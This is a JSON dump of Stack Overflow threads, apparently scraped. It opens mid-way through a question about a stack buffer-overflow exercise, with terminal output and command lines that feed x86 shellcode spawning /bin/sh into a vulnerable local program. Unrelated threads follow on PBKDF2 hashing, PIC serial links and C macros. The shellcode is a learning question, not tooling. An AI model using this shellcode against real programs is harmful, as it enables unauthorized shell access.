1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14864 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\nprobando direccion: 0xffffd6e5\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n./exploit.sh: l\u00ednea 7: 14869 Violaci\u00f3n de segmento  (`core' generado) ./example `python -c \"print '$shellcode'\"`\n</code></pre>\n\n<p>As you can see, in many different addresses (i.e 0xffffd6c0, 0xffffd6c1, 0xffffd6c3, 0xffffd6cf, 0xffffd6d1, etc..) I get a shell.</p>\n\n<p>What is the reason for this?</p>\n\n<p>The addresses <code>0xffffd6c0</code>, <code>0xffffd6c1</code> (first two) and <code>0xffffd6e0</code> (last address that I get a shell) can have sense because the first address in my shellcode is a nop and the true shellcode start at start+1 (this explain the first 2 shell that I get). The shell gets with the <code>0xffffd6e0</code> address makes sense because that address is the address of the call:</p>\n\n<pre><code>8048075:    e8 dc ff ff ff          call   8048056 &lt;first&gt;\n</code></pre>\n\n<p>But why the other shells that I get?</p>\n\n<p>In addition if I execute the vulnerable program with the address that my shell script gets shells I obtain segmentation faults</p>\n\n<pre><code>user:~/Documents/exploiting ./example `python -c \"print '\\x90\\xeb\\x1d\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xe8\\xde\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\xc0\\xd6\\xff\\xff'\"`\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n[1]    21580 segmentation fault (core dumped)  ./example \nuser:~/Documents/exploiting ./example `python -c \"print '\\x90\\xeb\\x1d\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xe8\\xde\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\xc1\\xd6\\xff\\xff'\"`\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n[1]    21584 segmentation fault (core dumped)  ./example \nuser:~/Documents/exploiting ./example `python -c \"print '\\x90\\xeb\\x1d\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb\\x89\\xd8\\x40\\xe8\\xde\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\xe0\\xd6\\xff\\xff'\"`\nWelcome \ufffd\ufffd^\ufffd1\ufffd\ufffdF\ufffdF\n                      \ufffd\n                       \ufffd\ufffd\ufffd\ufffdV\n                            1\u06c9\ufffd@\ufffd\ufffd\ufffd\ufffd\ufffd/bin/sh\ufffd\ufffd\ufffd\ufffd\n[1]    21588 segmentation fault (core dumped)  ./example\n</code></pre>\n\n<p>Is the same behavior that I get in <code>gdb</code>, shellscript also modified the stack addresses of program executes from them?</p>\n"}, {"tags": ["java", "c", "ssl", "encryption", "openssl"], "comments": [{"owner": {"reputation": 32972, "user_id": 150978, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/feadc214792e2581c3c750140e3eb2c7?s=128&d=identicon&r=PG", "display_name": "Robert", "link": "https://stackoverflow.com/users/150978/robert"}, "edited": false, "score": 0, "creation_date": 1476292963, "post_id": 40003909, "comment_id": 67287245, "body": "And don&#39;t add code in picture form, add it as text..."}, {"owner": {"reputation": 82953, "user_id": 608639, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/aPIhh.jpg?s=128&g=1", "display_name": "jww", "link": "https://stackoverflow.com/users/608639/jww"}, "edited": false, "score": 0, "creation_date": 1476387759, "post_id": 40003909, "comment_id": 67336400, "body": "Related, what does <code>create_anon_id</code> return on failure? It only seems to have a return code for the &quot;good path&quot;. <a href=\"https://www.openssl.org/docs/manmaster/crypto/PKCS5_PBKDF2_HMAC.html\" rel=\"nofollow noreferrer\"><code>PKCS5_PBKDF2_HMAC()</code> and <code>PBKCS5_PBKDF2_HMAC_SHA1()</code></a> return 1 on success or 0 on error. It seems like the code is missing a final <code>return 0</code>."}, {"owner": {"reputation": 543, "user_id": 4272727, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b5bc577764301b92f463c32f488dbe11?s=128&d=identicon&r=PG&f=1", "display_name": "kalyan chakravarthy", "link": "https://stackoverflow.com/users/4272727/kalyan-chakravarthy"}, "edited": false, "score": 0, "creation_date": 1476396150, "post_id": 40003909, "comment_id": 67340710, "body": "It is returning 0 for failure."}], "answers": [{"comments": [{"owner": {"reputation": 543, "user_id": 4272727, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b5bc577764301b92f463c32f488dbe11?s=128&d=identicon&r=PG&f=1", "display_name": "kalyan chakravarthy", "link": "https://stackoverflow.com/users/4272727/kalyan-chakravarthy"}, "edited": false, "score": 0, "creation_date": 1476396253, "post_id": 40026751, "comment_id": 67340761, "body": "Thanks for your response.  Along with code shared above it has below lines on top"}, {"owner": {"reputation": 543, "user_id": 4272727, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b5bc577764301b92f463c32f488dbe11?s=128&d=identicon&r=PG&f=1", "display_name": "kalyan chakravarthy", "link": "https://stackoverflow.com/users/4272727/kalyan-chakravarthy"}, "edited": false, "score": 0, "creation_date": 1476396264, "post_id": 40026751, "comment_id": 67340772, "body": "#define ROUNDS 10001 #include &quot;sys_ids.h&quot; #define HW_ID_SIZE (SYS_HW_ID_SIZE_C)  #define ANON_ID_BIN_SIZE      22 #define ANON_ID_SIZE          (ANON_ID_BIN_SIZE * 2)  #if BYTE_ORDER == BIG_ENDIAN #define bswap32(n) ((n &gt;&gt; 24) | ((n &amp; 0xff0000) &gt;&gt; 8) | ((n &amp; 0xff00) &lt;&lt; 8) | (n &lt;&lt; 24)) #else                                                                                    #define bswap32(n) (n)                                                                   #endif"}, {"owner": {"reputation": 23625, "user_id": 2868801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ec5567811049b7ce8192be0bc0246d1?s=128&d=identicon&r=PG&f=1", "display_name": "dave_thompson_085", "link": "https://stackoverflow.com/users/2868801/dave-thompson-085"}, "reply_to_user": {"reputation": 543, "user_id": 4272727, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b5bc577764301b92f463c32f488dbe11?s=128&d=identicon&r=PG&f=1", "display_name": "kalyan chakravarthy", "link": "https://stackoverflow.com/users/4272727/kalyan-chakravarthy"}, "edited": false, "score": 0, "creation_date": 1476546929, "post_id": 40026751, "comment_id": 67396220, "body": "@kalyanchakravarthy: it&#39;s better to edit your question to add additional info; comments (mostly) can&#39;t be formatted and sometimes are deleted. But I&#39;ve updated my answer accordingly. You don&#39;t have the collision risk but you still have the bruteforce problem."}, {"owner": {"reputation": 543, "user_id": 4272727, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b5bc577764301b92f463c32f488dbe11?s=128&d=identicon&r=PG&f=1", "display_name": "kalyan chakravarthy", "link": "https://stackoverflow.com/users/4272727/kalyan-chakravarthy"}, "edited": false, "score": 0, "creation_date": 1476658320, "post_id": 40026751, "comment_id": 67425801, "body": "Unfortunately I dont have control on that code.i have no issue whether it works or not.  The team who sends data to me has given me the logic which they are using for encryption and its my responsibility to develop decryption at my end . Unfortunately i have constriant on language and i have to use java."}, {"owner": {"reputation": 23625, "user_id": 2868801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ec5567811049b7ce8192be0bc0246d1?s=128&d=identicon&r=PG&f=1", "display_name": "dave_thompson_085", "link": "https://stackoverflow.com/users/2868801/dave-thompson-085"}, "reply_to_user": {"reputation": 543, "user_id": 4272727, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b5bc577764301b92f463c32f488dbe11?s=128&d=identicon&r=PG&f=1", "display_name": "kalyan chakravarthy", "link": "https://stackoverflow.com/users/4272727/kalyan-chakravarthy"}, "edited": false, "score": 0, "creation_date": 1476768862, "post_id": 40026751, "comment_id": 67472576, "body": "@kalyanchakravarthy: then you&#39;re up the creek without a paddle, unless <code>recvr_id smartcard_id hw_id</code> are quite limited. As I said, they aren&#39;t encrypting (which can be reversed), they are hashing (which can only be bruteforced). And Java makes it worse; it can&#39;t use GPU (for this) at all, and will probably be noticeably slower on CPU than C (after JIT; before JIT or with JIT disabled it will be <i>hugely</i> slower). My condolences."}], "tags": [], "owner": {"reputation": 23625, "user_id": 2868801, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9ec5567811049b7ce8192be0bc0246d1?s=128&d=identicon&r=PG&f=1", "display_name": "dave_thompson_085", "link": "https://stackoverflow.com/users/2868801/dave-thompson-085"}, "is_accepted": false, "score": 0, "last_activity_date": 1476546877, "last_edit_date": 1476546877, "creation_date": 1476377369, "answer_id": 40026751, "question_id": 40003909, "link": "https://stackoverflow.com/questions/40003909/decrypt-openssl-encrypted-data-using-java/40026751#40026751", "title": "Decrypt OpenSSL encrypted data using java", "body": "<p>That code is quite poor, although by bad luck some of the errors are masked by using an input which is exactly one triple-DES data block (64 bits or 8 bytes). If coded correctly the encryption would be done by both <code>EVP_EncryptUpdate</code> and <code>EVP_EncryptFinal</code>; as written the only encryption actually used, of the unpadded block, is done by <code>Update</code>. </p>\n\n<p>But the value returned in <code>anon_id</code> is <strong>NOT (JUST) ENCRYPTED</strong>. <code>PKCS5_PBKDF2_HMAC[_SHA1]</code> is an implementation of the <a href=\"https://en.wikipedia.org/wiki/PBKDF2\" rel=\"nofollow\">PBKDF2 algorithm</a> and as used here it computes essentially a slow hash of </p>\n\n<ul>\n<li><p><code>recvr_id</code> concatenated with <code>smartcard_id</code> (update: apparently not swapped) then triple-DES encrypted with <code>KEY</code> and <code>IV</code> whatever those are in this code, as the 'passphrase' with</p></li>\n<li><p><code>hw_id</code> (update: apparently not swapped, and thus 'accidentally' type-valid) as the salt, </p></li>\n<li><p>and PRF = HMAC-SHA1 for <code>ROUNDS</code> (update: 10001) iterations</p></li>\n<li><p>(update) expanded slightly to <code>ANON_ID_BIN_SIZE</code> (22) bytes. (This requires an extra 'pass' of PBKDF2 which actually hurts security; it slows the defender without slowing the attacker.)</p></li>\n</ul>\n\n<p><strong>PBKDF2</strong> with a decent PRF (HMAC-SHA1 is) <strong>is a one-way function and cannot be reversed</strong>, as encryption can if you know or guess the key. It is also designed to be <strong>costly to bruteforce</strong> if the salt and iteration count are chosen well. 32-bits of salt is definitely on the low side, and (update) ROUNDS 10001 is somewhat on the low side but not crazy.</p>\n\n<p>As a better-case example (for you as attacker) if the 32-bit <code>recvr_id</code> and <code>smartcard_id</code> each contain only 16-bits of entropy, and so does <code>hw_id</code>, and <code>ROUNDS</code> was 1000 which was the recommended value when rfc2898 was written at the turn of the century, you'd have to try up to 256 trillion possibilities and a typical desktop computer can do maybe 30 thousand per second in CPU, and with some luck and skill maybe a thousand times that in GPU, so that will take about 3 months.</p>\n\n<p>On the other hand, if the 32-bit inputs are fully entropic and <code>ROUNDS</code> was 1000000, it is impossible with just a computer. If you have a few million dollars to spend on FPGAs (or even better ASICs), and the output of a power plant (or maybe your own hydroelectric dam) to run them, it will still take many millions of years.</p>\n\n<p>Update: with ROUNDS 10001 you are most likely in between these situations, but just where depends strongly on the entropy of the inputs.</p>\n\n<p>And in general this may not produce the desired result anyway. If the output size is less than or even roughly equal to the entropy of the inputs, there will be <strong>collisions</strong> -- multiple input values (combinations) that produce the desired output, possibly a great many (millions, billions, etc) of such inputs. If you need <em>the</em> original input, rather than merely <em>some</em> input that produces (forges) a known output, you'll need some other method or criteria to select among the possible inputs that bruteforcing finds. \nUpdate: for output 22 bytes with at most 96 bits entropy, this <strong>risk is negligible</strong>.</p>\n"}], "owner": {"reputation": 543, "user_id": 4272727, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/b5bc577764301b92f463c32f488dbe11?s=128&d=identicon&r=PG&f=1", "display_name": "kalyan chakravarthy", "link": "https://stackoverflow.com/users/4272727/kalyan-chakravarthy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 205, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1476546877, "creation_date": 1476290349, "last_edit_date": 1476387342, "question_id": 40003909, "link": "https://stackoverflow.com/questions/40003909/decrypt-openssl-encrypted-data-using-java", "title": "Decrypt OpenSSL encrypted data using java", "body": "<p>I am trying to understand OpenSSL encryption. The requirement for me is to decrypt the data encrypted using the below code. It is creating an anonymous ID for receiver. I need to get received ID back.</p>\n\n<p>Based on the documentation I understood encryption is happening using <code>EVP_EncryptFinal</code>. But what is <code>PKCS5_PBKDF2_HMAC_SHA1</code> doing ?</p>\n\n<p>The code is using KEY and IV.</p>\n\n<pre><code>int create_anon_id(uint32_t recvr_id, uint32_t smartcard_id, const char *hw_id, unsigned char *anon_id)\n{\n    EVP_CIPHER_CTX ctx;\n    unsigned char ibuf[sizeof(recvr_id) + sizeof(smartcard_id)] = {};\n    unsigned char obuf[sizeof(ibuf) * 2] = {};\n    int olen = sizeof(obuf);\n\n    /* Convert to big endian. */\n    recvr_id = bswap32(recvr_id);\n    smartcard_id = bswap32(smartcard_id);\n    hw_id = bswap32(hw_id);\n\n    /* Fill input buffer with recvr_id | smartcard_id */\n    memcpy(ibuf, &amp;recvr_id, sizeof(recvr_id));\n    memcpy(ibuf + sizeof(recvr_id), &amp;smartcard_id, sizeof(smartcard_id));\n\n    if (EVP_EncryptInit(&amp;ctx, EVP_des_ede3_cbc(), KEY, IV) == 1)\n    {\n        if (EVP_EncryptUpdate(&amp;ctx, obuf, &amp;olen, ibuf, sizeof(ibuf)) == 1)\n        {\n            olen = sizeof(obuf) - olen;\n            if (EVP_EncryptFinal(&amp;ctx, obuf + sizeof(obuf) - olen, &amp;olen) == 1)\n            {\n                return PKCS5_PBKDF2_HMAC_SHA1((const char *)obuf, olen, (unsigned char *)hw_id, HW_ID_SIZE, ROUNDS, ANON_ID_BIN_SIZE, anon_id);\n            }\n        }\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "serial-port", "microcontroller", "pic", "microchip"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1476288173, "post_id": 40002985, "comment_id": 67284311, "body": "Do you have an oscilloscope? Look at the lines."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1476288375, "post_id": 40002985, "comment_id": 67284427, "body": "Step 1 For each physical port, tie pin 2,3 to each other (and nothing else) and see if the port can talk to itself.  This will help discern if the issue or SW or HW."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476288647, "post_id": 40002985, "comment_id": 67284598, "body": "RS232 was fine until it was decided that devices need to be classed as DTE or DCE. But as devices became more sophisticated they became harder to classify, leading to the situation where you need to look up which are the TX and RX (and handshake) pins. The sane way (to me) is to always have a crossover, so pin 2 is wired to pin 3. That allows any device to be connected to any other device. As for pullups, it depends where they are - a line driver may have an inverter."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476289403, "post_id": 40002985, "comment_id": 67285082, "body": "Besides the oscilloscope, a breakout box is a handy piece of kit for patching, and seeing the line level."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476289815, "post_id": 40002985, "comment_id": 67285335, "body": "As for noise, your picture seems to show an unshielded rs232 cable."}, {"owner": {"reputation": 6192, "user_id": 2041317, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/58b0m.png?s=128&g=1", "display_name": "cup", "link": "https://stackoverflow.com/users/2041317/cup"}, "edited": false, "score": 0, "creation_date": 1476527663, "post_id": 40002985, "comment_id": 67390467, "body": "Try a full null-modem.  i.e. 2-3, 4-6, 7-8.  Maybe your system has been set up for a hardware handshake.  If that doesn&#39;t work, 4 to 6 &amp; 1 and the same the other way round."}], "owner": {"reputation": 21, "user_id": 5943057, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/cd93873fa33e8e7a343f4cf41aa2b50b?s=128&d=identicon&r=PG&f=1", "display_name": "static prawn", "link": "https://stackoverflow.com/users/5943057/static-prawn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 114, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1476293463, "creation_date": 1476287487, "last_edit_date": 1476293463, "question_id": 40002985, "link": "https://stackoverflow.com/questions/40002985/why-pic-to-pic-trhough-max232-not-working", "title": "Why PIC to PIC trhough MAX232 not working?", "body": "<p>I'm trying to make a connection between 2 PICs, and a computer which works perfect in proteus but it has some problems in the real life. </p>\n\n<p>The goal is to communicate multiple (4 max) RS232 devices to a computer trough an interface which concentrates all channels in one as shown in the image. </p>\n\n<p><a href=\"https://i.stack.imgur.com/yfv9G.jpg\" rel=\"nofollow\"><img src=\"https://i.stack.imgur.com/yfv9G.jpg\" alt=\"enter image description here\"></a></p>\n\n<p>It has to be done with MAX232 because the environment is so noisy.</p>\n\n<p>Question: Why is the PIC to PIC through MAX232 not working?</p>\n\n<p>I have built couple of devices as I said, and both work properly when I connect them individually to the hyperterminal on the PC.</p>\n\n<p><a href=\"https://i.stack.imgur.com/OjVBe.jpg\" rel=\"nofollow\"><img src=\"https://i.stack.imgur.com/OjVBe.jpg\" alt=\"enter image description here\"></a></p>\n\n<p>But not when I connect them to each other... I've tried switching the TX and RX (DB-9:2,3) pins but it never worked. Actually, in some of the tests, the master got stuck.</p>\n\n<p>Should I put couple of pull UPS on the RX and TX? </p>\n\n<p>Also pull UPS to avoid the initial floating state witch happens before the pin set up? Is it dangerous? What value?</p>\n\n<p>You can download the project and all the pictures an schematics <a href=\"https://mega.nz/#!TxV3QArC!uqy1tq60LWeA1xtD4vg2Be3BIojndo_4C0V2LwO5eRY\" rel=\"nofollow\" title=\"Download files\">from this link.</a></p>\n\n<p>Thanks in advance!</p>\n\n<p>The code </p>\n\n<p>Master:</p>\n\n<pre><code>#include &lt;18f448.h&gt;\n#fuses HS,NOPROTECT,NOWDT\n\n#use delay(clock=20M)\n\n#use rs232(baud=9600,parity=N,xmit=PIN_C6,rcv=PIN_C7,bits=8, STREAM=COM_A)\n#use rs232(baud=9600,parity=N,xmit=PIN_C4,rcv=PIN_C5,bits=8, STREAM=COM_B) \nint rx;\n\n#int_RDA                              \n\nvoid RDA_isr()\n{\n    rx=getc(COM_A);    \n\n    fprintf(COM_A,\"%X\\n\\r\",rx); \n    fprintf(COM_B,\"%X\\n\\r\",rx);\n}\n\nvoid main() { \n   enable_interrupts(INT_RDA);    \n   enable_interrupts(GLOBAL);  \n}  \n</code></pre>\n\n<p>Slave:</p>\n\n<pre><code>#include &lt;16F84.h&gt; \n#fuses XT,NOWDT,NOPROTECT \n#use delay(clock=4000000)  \n#use rs232(baud=9600,parity=N,xmit=PIN_A1,rcv=PIN_A0,bits=8)  \nunsigned int rx; \n\nvoid main ()\n{  \n    set_tris_b(0b00000000);\n    set_tris_a(0b00000001); \n\n    while (1) { \n        rx = getc();    \n        printf(\"%X\", rx);  \n        rx = ~rx;\n        output_b(rx);  \n    }\n}\n</code></pre>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 7825, "user_id": 3684343, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5bee557e309dc42d91a706c70c8c0c9f?s=128&d=identicon&r=PG&f=1", "display_name": "mch", "link": "https://stackoverflow.com/users/3684343/mch"}, "edited": false, "score": 0, "creation_date": 1476287564, "post_id": 40002965, "comment_id": 67283879, "body": "can you change the define to <code>#define LOCATION &quot;&#47;usr&#47;lib&#47;siara&#47;&quot;</code>? In that case you can use <code>system(&quot;touch &quot;LOCATION&quot;myfile.txt&quot;);</code>."}, {"owner": {"reputation": 5748, "user_id": 767442, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/d26ad3fe7caf43447e39cd2307b515d7?s=128&d=identicon&r=PG&f=1", "display_name": "jforberg", "link": "https://stackoverflow.com/users/767442/jforberg"}, "edited": false, "score": 1, "creation_date": 1476287591, "post_id": 40002965, "comment_id": 67283898, "body": "The particular answer OP wants is this one: <a href=\"http://stackoverflow.com/a/32665978/767442\">stackoverflow.com/a/32665978/767442</a>"}, {"owner": {"reputation": 5455, "user_id": 4115625, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2688a9684db617a20f9da3959e5890d7?s=128&d=identicon&r=PG&f=1", "display_name": "Danh", "link": "https://stackoverflow.com/users/4115625/danh"}, "reply_to_user": {"reputation": 5748, "user_id": 767442, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/d26ad3fe7caf43447e39cd2307b515d7?s=128&d=identicon&r=PG&f=1", "display_name": "jforberg", "link": "https://stackoverflow.com/users/767442/jforberg"}, "edited": false, "score": 0, "creation_date": 1476287691, "post_id": 40002965, "comment_id": 67283963, "body": "@jforberg he can do it in compile time as mch&#39;s comment"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476288601, "post_id": 40002965, "comment_id": 67284563, "body": "@MichaelWalz, why is the OP&#39;s definition invalid?  There&#39;s certainly nothing wrong with the identifier, and I&#39;m missing why <code>&#47;usr&#47;lib&#47;siara&#47;</code> would fail to be a sequence of preprocessing tokens, which is the only constraint on that part.  It may indeed not be what he wants, but I think it&#39;s valid."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1476289010, "post_id": 40002965, "comment_id": 67284832, "body": "@JohnBollinger , you are right my comment is wrong, I&#39;ll delete it, thanks."}], "owner": {"reputation": 11, "user_id": 7008912, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f571c0627121c567b64777d511895c8f?s=128&d=identicon&r=PG&f=1", "display_name": "harish", "link": "https://stackoverflow.com/users/7008912/harish"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 32, "favorite_count": 0, "closed_date": 1476289530, "answer_count": 0, "score": 1, "last_activity_date": 1476287494, "creation_date": 1476287427, "last_edit_date": 1476287494, "question_id": 40002965, "link": "https://stackoverflow.com/questions/40002965/how-to-touch-a-file-to-a-particular-location-which-was-defined", "closed_reason": "Duplicate", "title": "how to touch a file to a particular location which was #defined", "body": "<p>Assume like I have a <code>#define</code> something like </p>\n\n<pre><code>#define LOCATION /usr/lib/siara/\n</code></pre>\n\n<p>Now i want to touch a file in that location provided I have permissions to create.\nI want to do something like this.</p>\n\n<pre><code>system(\"touch $(LOCATION)/myfile.txt\")\n</code></pre>\n\n<p>But it is not working. Any idea how to resolve this issue</p>\n"}, {"tags": ["c", "linux", "pointers"], "comments": [{"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "edited": false, "score": 1, "creation_date": 1476286908, "post_id": 40002778, "comment_id": 67283393, "body": "What is the exact error message?"}, {"owner": {"reputation": 7787, "user_id": 1257035, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/WHLC8.png?s=128&g=1", "display_name": "a3f", "link": "https://stackoverflow.com/users/1257035/a3f"}, "edited": false, "score": 4, "creation_date": 1476286973, "post_id": 40002778, "comment_id": 67283453, "body": "Always a good start is actually <i>reading</i> the error message (and adding it your question!)."}, {"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "edited": false, "score": 2, "creation_date": 1476287016, "post_id": 40002778, "comment_id": 67283484, "body": "I think you just have to cast <code>&amp;var</code> to <code>void*</code>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1476287065, "post_id": 40002778, "comment_id": 67283519, "body": "<code>printf(&quot;%p\\n&quot;, (void*)&amp;var);</code>"}, {"owner": {"reputation": 9142, "user_id": 1442918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7490251da02084a2e2720e20029d2bff?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/1442918/max"}, "edited": false, "score": 1, "creation_date": 1476287645, "post_id": 40002778, "comment_id": 67283925, "body": "Please provide the EXACT error message, not a paraphrase of it."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476287228, "post_id": 40002864, "comment_id": 67283625, "body": "So in Linux, the %p specifier requires a void pointer, but in Windows it doesn&#39;t?"}, {"owner": {"reputation": 55871, "user_id": 10077, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/be4e820c7af6f3b79cf055d984cda7ff?s=128&d=identicon&r=PG", "display_name": "Fred Larson", "link": "https://stackoverflow.com/users/10077/fred-larson"}, "reply_to_user": {"reputation": 21, "user_id": 7008800, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf4f969c960794b77464822ba952019d?s=128&d=identicon&r=PG&f=1", "display_name": "Marieke", "link": "https://stackoverflow.com/users/7008800/marieke"}, "edited": false, "score": 0, "creation_date": 1476287348, "post_id": 40002864, "comment_id": 67283714, "body": "I get a warning from gcc. I routinely compile stuff like this with <code>-pedantic -Wall -Wextra -Werror</code>. The Microsoft compiler may or may not have a warning level that reports this. What is your compile command line on each?"}, {"owner": {"reputation": 9142, "user_id": 1442918, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7490251da02084a2e2720e20029d2bff?s=128&d=identicon&r=PG", "display_name": "Max", "link": "https://stackoverflow.com/users/1442918/max"}, "edited": false, "score": 0, "creation_date": 1476287680, "post_id": 40002864, "comment_id": 67283954, "body": "Some compilers do less type checking than 